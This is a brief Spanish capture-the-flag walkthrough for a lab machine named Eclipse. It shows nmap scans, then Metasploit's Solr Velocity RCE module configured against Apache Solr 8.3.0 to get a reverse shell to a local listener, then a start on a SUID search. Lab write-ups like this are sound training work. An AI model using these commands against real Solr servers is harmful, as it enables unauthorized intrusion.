# Máquina Eclipse
 
### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.2

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p80,8983 -vvv -Pn 172.17.0.2

![alt text](image-1.png)

### Entramos a la web por el puerto 8983

y vimos que corre Apache Solr 8.3.0

### Intrusión

Entramos a metasploit y utilicé el exploit: exploit/multi/http/solr_velocity_rce

configuramos el exploit:

set RHOSTS 172.17.0.2
set LHOST 172.17.0.1
exploit 

enviamos una bash para mayor comodidad:

![alt text](image-2.png)

![alt text](image-3.png)

hacemos tratamiento de la tty

### Escalar privilegios

buscamos permisos SUID:

![alt text](image-4.png)

![alt text](image-5.png)